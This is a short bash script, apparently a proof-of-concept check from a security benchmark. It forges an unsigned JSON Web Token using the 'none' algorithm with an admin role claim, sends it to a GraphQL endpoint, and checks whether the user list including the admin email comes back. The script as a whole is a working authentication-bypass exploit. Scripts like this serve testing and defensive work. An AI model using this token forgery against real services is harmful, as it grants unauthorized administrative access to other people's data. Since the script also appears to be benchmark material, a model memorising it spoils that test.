#!/usr/bin/env bash
source "$(dirname "$0")/_lib.sh"
aid=$(user_id admin@bench.local)
tok=$(python3 - "$aid" <<'PY'
import base64,json,sys
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).decode().rstrip('=')
print(b({'alg':'none','typ':'JWT'})+'.'+b({'sub':int(sys.argv[1]),'role':'admin'})+'.')
PY
)
gql '{ users { email } }' "$tok" | grep -q 'admin@bench.local'
